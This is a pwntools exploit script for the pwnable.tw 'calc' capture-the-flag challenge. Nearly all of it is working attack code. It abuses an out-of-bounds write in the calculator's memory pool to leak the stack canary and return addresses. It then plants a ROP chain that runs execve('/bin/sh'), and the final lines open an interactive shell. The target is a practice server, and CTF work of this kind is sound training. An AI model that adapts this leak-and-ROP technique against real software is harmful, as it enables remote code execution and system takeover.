#!/usr/bin/env python2
from pwn import *
from ctypes import *
context(arch = 'i386', os = 'linux')

ready = True
if ready:
    conn = connect('chall.pwnable.tw', 10100)
else:
    conn = process('/home/doublesine/Desktop/calc')

def GetPoolData(i):
    expr = '+%d' % (i + 1)
    conn.sendline(expr)
    return int(conn.read())

def SetPoolData(i, value):
    value = c_int32(value).value
    if value > 0:
        expr = '+%d+%d' % (i, value)
        conn.sendline(expr)
        conn.read()
    elif value < 0:
        after_value = GetPoolData(i + 1)
        SetPoolData(i, after_value)
        expr = '+%d-%d' % (i + 1, -value)
        conn.sendline(expr)
        conn.read()
        expr = '+%d-%d' % (i + 1, after_value)
        conn.sendline(expr)
        conn.read()
    else:
        after_value = GetPoolData(i + 1)
        SetPoolData(i, after_value)
        expr = '+%d-%d' % (i + 1, after_value)
        conn.sendline(expr)
        conn.read()

conn.read()

canary = GetPoolData(356)
main_ebp = GetPoolData(359)
calc_ret_addr = GetPoolData(360)
print('canary = 0x' + pack(canary, 32)[::-1].encode('hex'))
print('main_ebp = 0x' + pack(main_ebp, 32)[::-1].encode('hex'))
print('calc_ret_addr = 0x' + pack(calc_ret_addr, 32)[::-1].encode('hex'))

reloc_offset = calc_ret_addr - 0x08049499
calc_ebp = (main_ebp & 0xFFFFFFF0) - 0x10 - 4 - 4
p_ret_addr = calc_ebp + 4

# 0x08055165 : mov edx, 0xffffffff ; ret
# 0x0805d4bf : mov esi, edx ; ret
# 0x0805df07 : inc edx ; ret
# 0x080dc6fe : inc esi ; ret
# 0x080701d1 : pop ecx ; pop ebx ; ret
# 0x0806f4eb : dec ecx ; ret
# 0x0805c34b : pop eax ; ret
# 0x080481d1 : pop ebx ; ret
# 0x08049a21 : int 0x80

SetPoolData(374, unpack('/sh\x00', 32))
SetPoolData(373, unpack('/bin', 32))
SetPoolData(372, 0x08049a21 + reloc_offset)
SetPoolData(371, p_ret_addr + (373 - 360) * 4)
SetPoolData(370, 0x080481d1 + reloc_offset)
SetPoolData(369, 0xb)
SetPoolData(368, 0x0805c34b + reloc_offset)
SetPoolData(367, 0x0806f4eb + reloc_offset)
SetPoolData(366, 1)
SetPoolData(365, 1)
SetPoolData(364, 0x080701d1 + reloc_offset)
SetPoolData(363, 0x080dc6fe + reloc_offset)
SetPoolData(362, 0x0805df07 + reloc_offset)
SetPoolData(361, 0x0805d4bf + reloc_offset)
SetPoolData(360, 0x08055165 + reloc_offset)
SetPoolData(359, main_ebp)
SetPoolData(358, unpack('fuck', 32))
SetPoolData(357, unpack('fuck', 32))
SetPoolData(356, canary)

conn.sendline()     # trigger ROP chain
conn.interactive()  # you will get shell here
conn.close()
